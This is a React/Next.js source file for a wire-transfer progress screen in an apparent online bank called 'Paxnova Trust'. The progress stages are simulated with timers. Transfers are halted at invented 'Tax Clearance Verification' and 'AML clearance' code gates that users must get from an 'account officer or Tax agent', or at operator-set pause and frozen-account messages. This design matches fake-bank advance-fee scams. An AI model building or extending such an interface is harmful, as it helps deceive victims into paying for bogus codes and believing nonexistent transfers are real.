"use client";

import Link from "next/link";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { AlertTriangle, CheckCircle2, KeyRound, Loader2 } from "lucide-react";
import { currency } from "@/lib/format";
import { FrozenCard } from "../../../_components/InterruptCards";
import {
  verifyAmlCodeAction,
  verifyTcvCodeAction,
} from "@/app/actions/transfer-verify";

type WireStatus =
  | "scheduled"
  | "processing"
  | "completed"
  | "cancelled"
  | "failed"
  | "pending_tcv"
  | "pending_aml"
  | "interrupted_custom"
  | "rejected_frozen";

const STAGES = [
  { label: "Validating wire details", ms: 700 },
  { label: "Verifying recipient bank routing", ms: 900 },
  { label: "Reserving funds", ms: 900 },
  { label: "Submitting to the wire network", ms: 1100 },
  { label: "Scheduling with the Paxnova Trust wire network", ms: 1000 },
];

export function WireProgress({
  referenceNumber,
  amount,
  fee,
  recipientName,
  status: initialStatus,
  accountType,
  accountCurrency,
  interruptMessage,
}: {
  referenceNumber: string;
  amount: number;
  fee: number;
  recipientName: string;
  status: WireStatus;
  accountType: string;
  accountCurrency: string;
  interruptMessage: string | null;
}) {
  const router = useRouter();
  const [status, setStatus] = useState<WireStatus>(initialStatus);
  const [stage, setStage] = useState(0);

  useEffect(() => {
    if (status === "rejected_frozen") return;

    const target = targetStageFor(status);
    if (stage >= target) return;

    const timers: ReturnType<typeof setTimeout>[] = [];
    let acc = 0;
    for (let i = stage; i < target; i++) {
      acc += STAGES[i].ms;
      const idx = i + 1;
      timers.push(setTimeout(() => setStage(idx), acc));
    }
    if (
      target === STAGES.length &&
      (status === "scheduled" || status === "processing")
    ) {
      timers.push(
        setTimeout(() => {
          router.replace(
            `/dashboard/transfer/wires/schedule/done?ref=${encodeURIComponent(
              referenceNumber
            )}`
          );
        }, acc + 600)
      );
    }
    return () => timers.forEach((t) => clearTimeout(t));
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [status, referenceNumber, router]);

  if (status === "rejected_frozen") {
    return (
      <FrozenCard
        accountType={accountType}
        referenceNumber={referenceNumber}
      />
    );
  }

  const pct = Math.min(100, (stage / STAGES.length) * 100);
  const target = targetStageFor(status);
  const atStop = stage >= target && stage < STAGES.length;
  const isCustomStop = status === "interrupted_custom" && atStop;
  const isGate =
    atStop && (status === "pending_tcv" || status === "pending_aml");

  return (
    <div className="mx-auto max-w-xl space-y-4">
      <div className="rounded-2xl border border-border bg-card p-8 text-center shadow-soft">
        <p className="text-xs uppercase tracking-wider text-muted-foreground">
          Reference {referenceNumber}
        </p>
        <h1 className="mt-1 font-display text-2xl font-semibold tracking-tight">
          Scheduling your wire…
        </h1>
        <p className="mt-1 text-sm text-muted-foreground">
          {currency(amount, accountCurrency)} to {recipientName} · fee{" "}
          {currency(fee, accountCurrency)}
        </p>

        <div className="mt-6 h-2 overflow-hidden rounded-full bg-muted">
          <div
            className="h-full rounded-full bg-gradient-to-r from-violet-500 to-violet-600 transition-all duration-500"
            style={{ width: `${pct}%` }}
          />
        </div>

        <ul className="mt-6 space-y-2 text-left">
          {STAGES.map((s, i) => {
            const done = i < stage;
            // Show the stop-stage as "Working…" for Custom (so the user can
            // see they're paused at Reserving funds). For Code gates, hide
            // the spinner since the user has to enter a code first.
            const active =
              i === stage && (!isGate || isCustomStop) && stage < STAGES.length;
            return (
              <li
                key={s.label}
                className="flex items-center gap-3 rounded-lg px-3 py-2 text-sm"
              >
                {done ? (
                  <CheckCircle2 className="size-4 text-success" />
                ) : active ? (
                  <Loader2 className="size-4 animate-spin text-violet-500" />
                ) : (
                  <span className="inline-block size-4 rounded-full border border-border" />
                )}
                <span
                  className={
                    done
                      ? "text-foreground"
                      : active
                      ? "text-foreground font-medium"
                      : "text-muted-foreground"
                  }
                >
                  {s.label}
                </span>
              </li>
            );
          })}
        </ul>
      </div>

      {isCustomStop && (
        <div className="w-full rounded-2xl border border-gold-500/40 bg-gold-500/5 p-6">
          <div className="flex items-start gap-3">
            <span className="inline-flex size-10 shrink-0 items-center justify-center rounded-full bg-gold-500/20 text-gold-700 dark:text-gold-300">
              <AlertTriangle className="size-5" />
            </span>
            <div className="min-w-0 flex-1">
              <p className="text-xs font-semibold uppercase tracking-wider text-gold-700 dark:text-gold-300">
                Transfer paused
              </p>
              <p className="mt-2 whitespace-pre-line text-base font-bold text-foreground">
                {interruptMessage ||
                  "Your wire was interrupted by an internal review hold."}
              </p>
              <p className="mt-3 text-xs text-muted-foreground">
                Reference{" "}
                <span className="font-mono">{referenceNumber}</span>
              </p>
              <Link
                href="/dashboard"
                className="mt-4 inline-flex h-10 items-center justify-center rounded-full bg-violet-500 px-5 text-sm font-semibold text-white hover:bg-violet-600"
              >
                Back to dashboard
              </Link>
            </div>
          </div>
        </div>
      )}

      {isGate && status === "pending_tcv" && (
        <CodeGate
          kind="tcv"
          length={10}
          referenceNumber={referenceNumber}
          onVerified={(newStatus) => setStatus(newStatus as WireStatus)}
        />
      )}
      {isGate && status === "pending_aml" && (
        <CodeGate
          kind="aml"
          length={12}
          referenceNumber={referenceNumber}
          onVerified={(newStatus) => setStatus(newStatus as WireStatus)}
        />
      )}
    </div>
  );
}

// ────────────────────────────────────────────────────────────────────────

function targetStageFor(status: WireStatus): number {
  // Pause when "Verifying recipient bank routing" is the active stage.
  if (status === "pending_tcv") return 1;
  // Pause when "Scheduling with the Paxnova Trust wire network" is the active stage.
  if (status === "pending_aml") return STAGES.length - 1; // = 4
  // Pause when "Reserving funds" is the active stage.
  if (status === "interrupted_custom") return 2;
  if (status === "scheduled" || status === "processing") return STAGES.length;
  return STAGES.length;
}

function CodeGate({
  kind,
  length,
  referenceNumber,
  onVerified,
}: {
  kind: "tcv" | "aml";
  length: number;
  referenceNumber: string;
  onVerified: (newStatus: string) => void;
}) {
  const [code, setCode] = useState("");
  const [pending, setPending] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const label =
    kind === "tcv"
      ? "Tax Clearance Verification (TCV) code"
      : "Anti-Money-Laundering (AML) clearance code";
  const subtitle =
    kind === "tcv"
      ? "Enter the 10-character TCV code on file for this account."
      : "Enter the 12-character AML code on file for this account.";
  const helper =
    kind === "tcv"
      ? "Contact your account officer or Tax agent for this code."
      : "Contact your account officer for this code.";

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setPending(true);
    const res =
      kind === "tcv"
        ? await verifyTcvCodeAction(referenceNumber, code)
        : await verifyAmlCodeAction(referenceNumber, code);
    setPending(false);
    if (!res.ok) {
      setError(res.message);
      return;
    }
    onVerified(res.status);
  }

  return (
    <form
      onSubmit={onSubmit}
      className="w-full rounded-2xl border border-violet-500/30 bg-violet-500/5 p-6 text-left"
    >
      <div className="flex items-center gap-3">
        <span className="inline-flex size-10 items-center justify-center rounded-full bg-violet-500 text-white">
          <KeyRound className="size-5" />
        </span>
        <div>
          <p className="text-xs font-semibold uppercase tracking-wider text-violet-600 dark:text-violet-300">
            Verification required
          </p>
          <h3 className="font-semibold">{label}</h3>
          <p className="mt-0.5 text-xs text-muted-foreground">{subtitle}</p>
        </div>
      </div>

      <div className="mt-4 flex items-center gap-2">
        <input
          type="text"
          value={code}
          onChange={(e) =>
            setCode(
              e.target.value
                .replace(/[^A-Za-z0-9]/g, "")
                .toUpperCase()
                .slice(0, length)
            )
          }
          maxLength={length}
          autoCapitalize="characters"
          autoCorrect="off"
          spellCheck={false}
          placeholder={`${length}-character code`}
          className="h-11 flex-1 rounded-lg border border-border bg-background px-3 font-mono text-base tracking-[0.2em]"
          aria-invalid={Boolean(error)}
        />
        <button
          type="submit"
          disabled={pending || code.length !== length}
          className="inline-flex h-11 items-center justify-center rounded-full bg-violet-500 px-5 text-sm font-semibold text-white hover:bg-violet-600 disabled:opacity-60"
        >
          {pending ? <Loader2 className="size-4 animate-spin" /> : "Verify"}
        </button>
      </div>
      <p className="mt-2 text-[11px] italic text-muted-foreground">{helper}</p>
      {error && (
        <p className="mt-2 text-xs text-danger" role="alert">
          {error}
        </p>
      )}
    </form>
  );
}
